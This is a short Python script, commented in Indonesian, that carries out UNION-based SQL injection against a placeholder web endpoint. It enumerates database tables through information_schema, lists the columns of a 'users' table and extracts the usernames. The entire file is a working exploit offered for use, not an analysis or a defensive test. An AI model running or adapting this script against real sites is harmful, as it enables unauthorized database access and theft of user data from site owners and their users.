import requests

def exploit_sql_injection(url, param, payload):
    exploit_url = f"{url}?{param}={payload}"
    response = requests.get(exploit_url)
    return response.text

def enumerate_tables(url, param):
    payload = "1 UNION SELECT table_name FROM information_schema.tables--"
    response = exploit_sql_injection(url, param, payload)
    return response

def enumerate_columns(url, param, table):
    payload = f"1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--"
    response = exploit_sql_injection(url, param, payload)
    return response

def extract_data(url, param, table, column):
    payload = f"1 UNION SELECT {column} FROM {table}--"
    response = exploit_sql_injection(url, param, payload)
    return response

if __name__ == "__main__":
    url = "http://example.com/vulnerable_endpoint"
    param = "id"

    # Enumerasi tabel
    tables = enumerate_tables(url, param)
    print("Tables in database:")
    print(tables)

    # Enumerasi kolom dalam tabel tertentu
    table = "users"
    columns = enumerate_columns(url, param, table)
    print(f"Columns in table {table}:")
    print(columns)

    # Ekstraksi data dari tabel tertentu
    column = "username"
    data = extract_data(url, param, table, column)
    print(f"Data in column {column} of table {table}:")
    print(data)
